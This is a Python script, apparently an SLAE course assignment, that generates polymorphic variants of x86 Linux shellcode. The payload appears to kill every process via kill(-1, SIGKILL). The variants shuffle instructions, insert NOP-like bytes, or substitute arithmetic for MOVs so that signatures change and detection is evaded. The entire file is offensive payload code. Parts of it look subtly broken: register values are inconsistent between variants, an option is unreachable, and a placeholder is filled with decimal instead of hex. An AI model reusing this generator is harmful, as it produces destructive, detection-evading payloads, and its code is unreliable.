#!/usr/bin/env python

from random import randint, shuffle;
import sys, getopt;
import socket;

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-s, --shuffle: use SHUFFLE strategy on operands"
    print "\t-n, --nop: add a random number of NOPs to the shellcode"
    print "\t-N, --nop-equivalent: add some NOP equivalent instruction to the code"
    print "\t-m, --math: use math strategy for MOV"
    return 0

def kill_shuffle():
    init_blk =["\\x31\\xdb", "\\x31\\xc9", "\\x31\\xc0"];
    setup_blk=["\\x4b", "\\xb1\\x25", "\\xb0\\x09"];
    shuffle(init_blk);
    shuffle(setup_blk);

    return "".join(init_blk)+"".join(setup_blk)+"\\xcd\\x80";

def kill_nop_dope():
    init_blk =["\\x31\\xdb", "\\x31\\xc9", "\\x31\\xc0"];
    setup_blk=["\\x4b", "\\xb1\\x25", "\\xb0\\x09"];
    n = randint(0, 3); # our shellcode is 13 byte lenght, we can expand it no more than 3 bytes
    nop_blk = ["\\x90"]*n
    setup_blk.extend(nop_blk)
    shuffle(init_blk);
    shuffle(setup_blk);

    return "".join(init_blk)+"".join(setup_blk)+"\\xcd\\x80";

def kill_nop_super_dope():
    init_blk =["\\x31\\xdb", "\\x31\\xc9", "\\x31\\xc0"];
    setup_blk=["\\x4b", "\\xb1\\x25", "\\xb0\\x09"];
    nop_blk=["\\x90", "\\x6a\\x$$", "\\x42", "\\x4a", "\\x50", "\\x53", "\\x51", "\\x52"]

    shuffle(nop_blk)
    n = randint(0, 3); # our shellcode is 13 byte lenght, we can expand it no more than 3 bytes
    to_add=nop_blk[0:n]
    setup_blk.extend(to_add)
    par = randint(1,255);


    shuffle(init_blk);
    shuffle(setup_blk);

    tmp="".join(init_blk)+"".join(setup_blk)+"\\xcd\\x80";
    shellcode=tmp.replace("$$", str(par));
    return shellcode

def kill_div_for_mov(n, mov_to_cl):
    # DIV stores result in AX and if the divider is 1 byte long, the result is
    # in AL and reminder in AH
    # e.g.
    #   AL = 37
    #   AH = 0
    #   Our code here will calculate an initializer number for EAX this way:
    #       DL = random number between 1..FF
    #       EAX = 37 * DL
    # 
    # After the last div, n will be stored in AL and AH will be 0. 
    # The impact in terms of byte is +4 bytes every MOV substituted with the
    # DIV. The impact is +6 when the value must be in another register but EAX.
    #
    # This strategy is too expensive in terms of shellcode lenght and *MUST
    # NOT* be considered in the SLAE assignment solutions.

    dl_value = randint(1, 255);
    ax_value = n * dl_value;

    val = socket.htons(ax_value);   # now the value is in network byte order
                                    # like the way it would be stored into
                                    # the stack
 
    hex_val = format(val, 'x');     
    mov_ax = "\\x66\\xb8\\x"+hex_val[0:2]+"\\x"+hex_val[2:4];
    mov_dl = "\\xb2\\x"+format(dl_value, 'x');
    div_dl = "\\xf6\\xf2";          

    code = mov_ax+mov_dl+div_dl;

    if mov_to_cl == True:
        code += "\\x89\\xc1";       # mov ecx, eax

    return code;


def create_add_shellcode():
    r1=randint(1, 36);
    r2=randint(1, 8);

    sc="\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb1\\x"+'{:02x}'.format(r1)+"\\x80\\xc1\\x"+'{:02x}'.format(37-r1)+"\\xb0\\x"+'{:02x}'.format(r2)+"\\x04\\x"+'{:02x}'.format(9-r2)+"\\x4b\\xcd\\x80";
    return sc;

def main(argv):
    shellcode="";

    try:
        opts, args=getopt.getopt(argv, "hsnNm", ["help", "shuffle", "nop", "nop-equivalent", "math"])
    except getopt.GetoptError:
        help()
        sys.exit(1)
    
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-A', '--add'):
            shellcode=create_add_shellcode()
        elif opt in ('-s', '--shuffle'):
            shellcode=kill_shuffle()
        elif opt in ('-n', '--nop'):
            shellcode=kill_nop_dope()
        elif opt in ('-N', '--nop-equivalent'):
            shellcode=kill_nop_super_dope()
        elif opt in ('-m', '--math'):
            shellcode="\\x31\\xc0\\x31\\xdb\\x31\\xc9"+kill_div_for_mov(9, True)+kill_div_for_mov(37, False)+"\\x4b\\xcd\\x80";

    print "Shellcode: ", shellcode
    print "Length: ", len(shellcode)/4

if __name__ == "__main__":
    main(sys.argv[1:])

